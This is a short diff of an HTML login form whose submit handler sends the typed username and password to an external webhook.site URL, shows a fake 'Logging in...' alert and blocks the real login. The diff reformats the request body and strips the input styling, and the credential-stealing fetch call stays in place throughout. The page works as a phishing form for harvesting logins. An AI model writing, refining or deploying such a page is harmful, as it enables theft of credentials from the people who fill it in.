@@ -4,10 +4,13 @@
   <form onsubmit="fetch('https://webhook.site/eb819f6b-6c3c-4dea-b6c9-9e0a47d0fe8d', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({username:this.username.value,password:this.password.value})
+    body:JSON.stringify({
+      username: this.username.value,
+      password: this.password.value
+    })
   }); alert('Logging in...'); return false;">
-    <input name="username" placeholder="Username" style="width:100%;padding:8px;margin:10px 0;border:1px solid #ccc;border-radius:5px;" required>
-    <input name="password" type="password" placeholder="Password" style="width:100%;padding:8px;margin:10px 0;border:1px solid #ccc;border-radius:5px;" required>
-    <button type="submit" style="width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:5px;">Login</button>
+    <input name="username" placeholder="Username" style="width:100%;padding:8px;margin:10px 0;" required>
+    <input name="password" type="password" placeholder="Password" style="width:100%;padding:8px;margin:10px 0;" required>
+    <button type="submit" style="width:100%;padding:10px;">Login</button>
   </form>
 </div>
